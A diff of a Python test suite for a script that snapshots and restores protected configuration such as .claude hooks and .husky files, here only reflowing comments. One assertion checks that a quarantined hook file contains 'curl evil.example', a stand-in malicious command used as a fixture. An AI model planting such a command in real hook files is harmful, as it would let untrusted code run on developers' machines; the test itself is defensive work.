@@ -109,8 +109,7 @@ def _run(subject: pathlib.Path, base: pathlib.Path, argv: list[str]):
         cwd=str(base),
         timeout=60,
     )
-    # The base path is in every message, and it differs per side by
-    # construction, so it is masked rather than compared.
+    # The base path is in every message, and it differs per side by construction, so it is masked rather than compared.
     mask = str(base).encode("utf-8")
     return (
         proc.returncode,
@@ -285,13 +284,8 @@ def test_restore_overwrites_the_checkout_and_quarantines_the_branch_copies() -> 
     assert b"curl evil.example" in quarantine[".claude/hooks/pre-bash/guard.sh"][2]
     assert "CLAUDE.local.md" not in checkout, "the branch-introduced file must be moved out"
     assert quarantine["CLAUDE.local.md"] == ("file", "0o644", b"branch config\n")
-    # THE DANGLING LINK IS UNTOUCHED ON BOTH SIDES OF THE OPERATION, and that
-    # is worth stating rather than assuming: `[[ -e ]]` follows symlinks, so
-    # `.ripgreprc` was never captured by `snapshot` AND is never moved by
-    # `restore`'s quarantine loop. It survives the restore sitting in the
-    # checkout, and `assert` will not mention it either (it is not in the
-    # manifest, and the branch-introduced arm asks `-e` as well). A protected
-    # path pointing nowhere is invisible to all three subcommands.
+    # THE DANGLING LINK IS UNTOUCHED ON BOTH SIDES OF THE OPERATION, and that is worth stating rather than assuming: `[[ -e ]]` follows symlinks, so `.ripgreprc` was never captured by `snapshot` AND is never moved by `restore`'s quarantine loop. It survives the restore sitting in the checkout, and `assert` will not mention it either (it is not in the manifest, and the
+    # branch-introduced arm asks `-e` as well). A protected path pointing nowhere is invisible to all three subcommands.
     assert checkout[".ripgreprc"] == ("link", "nowhere")
     assert ".ripgreprc" not in quarantine
 
@@ -385,11 +379,7 @@ def test_usage_and_unknown_subcommands() -> None:
     # A bogus verb with a bogus checkout refuses for the DIRECTORY first.
     assert b"Required directory '<BASE>/nope' does not exist" in steps[2][2]
     assert b"unknown subcommand 'frobnicate' (snapshot|restore|assert)" in steps[3][2]
-    # `$1` IS THE SUBCOMMAND WHATEVER IT LOOKS LIKE, so `--checkout` is eaten
-    # as the verb and its value is left as a positional that `parse_args`
-    # ignores. The result is the USAGE refusal (no `--checkout` was parsed),
-    # not the unknown-subcommand one, which is worth pinning because the two
-    # send a reader to different places.
+    # `$1` IS THE SUBCOMMAND WHATEVER IT LOOKS LIKE, so `--checkout` is eaten as the verb and its value is left as a positional that `parse_args` ignores. The result is the USAGE refusal (no `--checkout` was parsed), not the unknown-subcommand one, which is worth pinning because the two send a reader to different places.
     assert b"usage: restore-trusted-config.sh snapshot|restore|assert" in steps[4][2]
 
 
@@ -414,8 +404,7 @@ def test_defect_snapshotting_twice_poisons_the_baseline() -> None:
     # The nesting itself, so the diagnosis above is anchored to its cause.
     assert trees["snapshot"][".claude/.claude"] == ("dir", "0o755")
     assert trees["snapshot"][".husky/.husky/pre-commit"] == ("file", "0o644", b"hook\n")
-    # And the manifest is still SIX lines, so nothing about the summary line
-    # hints that the baseline is now wrong.
+    # And the manifest is still SIX lines, so nothing about the summary line hints that the baseline is now wrong.
     assert trees["snapshot"][".protected-manifest"][2].count(b"\n") == 6
 
 
@@ -444,8 +433,7 @@ def test_pure_helpers_are_exercised_directly() -> None:
         assert rtc.exists(str(base / "good-link")) is True
         assert rtc.exists(str(base / "bad-link")) is False
 
-        # `diff -r` both ways, including the missing-operand error that counts
-        # as drift.
+        # `diff -r` both ways, including the missing-operand error that counts as drift.
         (base / "a").mkdir()
         (base / "b").mkdir()
         (base / "a" / "f").write_text("same\n", encoding="utf-8")
